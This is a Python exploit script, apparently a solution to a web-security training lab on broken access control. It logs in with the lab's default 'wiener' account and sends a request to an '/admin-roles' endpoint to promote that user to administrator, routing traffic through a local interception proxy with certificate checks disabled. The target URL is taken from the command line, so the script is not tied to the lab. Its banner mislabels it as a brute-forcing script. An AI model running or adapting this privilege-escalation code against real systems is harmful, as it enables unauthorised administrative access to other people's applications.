import requests,argparse,urllib3,sys
from random import randrange
from termcolor import colored,COLORS
from colorama import init
from pyfiglet import figlet_format,FigletFont

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def banner(name):
    global random_colore
    # generating randfonts
    List=FigletFont.getFonts()
    random_numbner=randrange(len(List)-1)
    random_font=List[random_numbner]

    # generating randcolors
    color=[]
    for i in COLORS:
        if i !='black' and i!='light_blue' and i!='grey':
            color.append(i)
    random_numbner=randrange(len(color)-1)
    random_colore=color[random_numbner]

    #  printing the banner 
    font=figlet_format(name,font=random_font)
    print(colored(font,random_colore))
    print(colored("Build a Simple brute forcing Script with Python", 'yellow'))
    print(colored("Author: @oussamabinike\n", 'yellow'))

def parsearg():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument('-u','--url',
                        dest='url',
                        help='url for the target ex : https://www.example.com',
                        required=True)
    return parser.parse_args()

def post_method(s,url,data):
    try:
        r=s.post(url,verify=False, proxies=proxies,data=data)
        return r 
    except Exception as e:
        print(colored(e,'red'))

def upgrade_wiener_user(s, url):

    # login as the wiener user
    login_url = url + '/login'
    data_login = {'username': 'wiener', 'password': 'peter'}
    r = post_method(s=s,url=login_url,data=data_login)

    if "wiener" in r.text:
        print(colored("(+) Successfully logged in as the wiener user...",'blue'))

        print(colored('(+) Upgrading user to administrator...','blue'))
        upgrade_url = url + "/admin-roles"
        data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}
        r = post_method(s=s,url=upgrade_url,data=data_upgrade)
        if r.status_code == 200:
            print(colored("(+) Successfully upgraded user to administrator.",'green'))
        else:
            print(colored("(-) Could not upgrade user to administrator.",'red'))
            sys.exit(-1)

    else:
        print(colored("(-) Could not login as the wiener user.",'red'))
        sys.exit(-1)
def main():

    banner(name='broken access')
    url=parsearg().url
    url=str(url).rstrip('/')

    s=requests.session()
    upgrade_wiener_user(s=s,url=url)
    
  


if __name__ == "__main__":
    main()
    a="""  .-'''''-.
 ('    o o')
  |   '-'   |
  |  .-^-  |
   '-...-'
"""
    print('\n'+colored(a,random_colore))